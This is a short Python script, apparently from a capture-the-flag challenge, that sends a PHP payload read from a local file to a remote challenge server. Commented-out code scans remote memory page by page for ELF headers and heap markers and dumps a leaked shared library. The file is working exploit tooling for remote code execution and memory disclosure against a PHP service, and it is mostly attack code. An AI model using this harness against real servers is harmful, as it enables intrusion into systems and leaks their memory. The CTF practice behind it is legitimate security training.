import requests
import subprocess
import sys

with open("solve.php", "rb") as f:
    data = f.read()[6:-3].lstrip().strip()

# def write_shit(data):
    # with open("test.php", "wb") as f:
        # f.write("<?php "+data+"?>")

def gen_out(data):
    return requests.get("http://pwnable.org:19261/", params={'rh':data}).content
    # write_shit(data)
    # return subprocess.check_output("php test.php", shell=True)



def get_offset(offset):
    new_data = data#.replace("REPLACE_OFFSET", str(offset))
    return gen_out(new_data)

# with open("sizelog", "rb") as f:
    # l_offset = [int(x) for x in f.read().strip().lstrip().split("\n")]

# l_shit = get_offset((11869+9)*0x1000 + 0x1863D8)
# deet = l_shit[l_shit.index("AAAA")+4:]
# print(deet)


# with open("dumped.so", "wb") as f:
    # f.write(deet)

print(get_offset(0)) 

# for each in l_offset:
    # try:
        # deet = get_offset(each*0x1000)
        # deet = deet[deet.index("AAAA"):]
        # with open("fshit/{}.log".format(each), "wb") as f:
            # f.write(deet)
    # except:
        # pass

# for m in range(int(sys.argv[1]), int(sys.argv[2])):
    # try:
        # if m%0x40 == 0:
            # print "Currently -> {}".format(m)
        # deet = get_offset(m*0x1000);
        # if "ELF" in deet:
            # print "SICE -> {}".format(m)
            # print(deet)
            # new_l = get_offset(m*0x1000 + 0x1b8be8)
            # if 'smallbin' in new_l:
                # print "BIGSICE -> {}".format(m)
    # except:
        # pass

